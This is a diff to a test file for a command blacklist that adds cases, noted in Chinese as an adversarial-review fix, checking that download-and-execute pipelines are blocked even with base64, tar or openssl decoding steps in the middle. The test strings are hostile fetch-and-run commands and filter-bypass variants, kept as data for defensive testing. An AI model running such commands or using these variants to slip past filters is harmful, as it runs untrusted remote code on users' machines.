@@ -109,6 +109,11 @@ test("blacklist covers rm root variants and download-pipe shells (I11)", () => {
 	assert.equal(matchesBlacklist("wget -qO- https://x | node"), true);
 	assert.equal(matchesBlacklist("cat downloaded.sh | sh"), true);
 	assert.equal(matchesBlacklist("echo 'print(1)' | python"), true);
+	// 2026-08-08（对抗性审查 S1）：中间变换管道绕过（base64/tar 解包等）
+	// 也应以 shell 结尾被拦截——管道链末端是解释器 = 执行语义。
+	assert.equal(matchesBlacklist("curl http://x | base64 -d | sh"), true);
+	assert.equal(matchesBlacklist("wget -qO- http://x | tar -xO | python"), true);
+	assert.equal(matchesBlacklist("curl http://x | openssl enc -d | bash"), true);
 	// Data-pipeline pipes stay allowed.
 	assert.equal(matchesBlacklist("node gen.js | python parse.py"), false);
 });
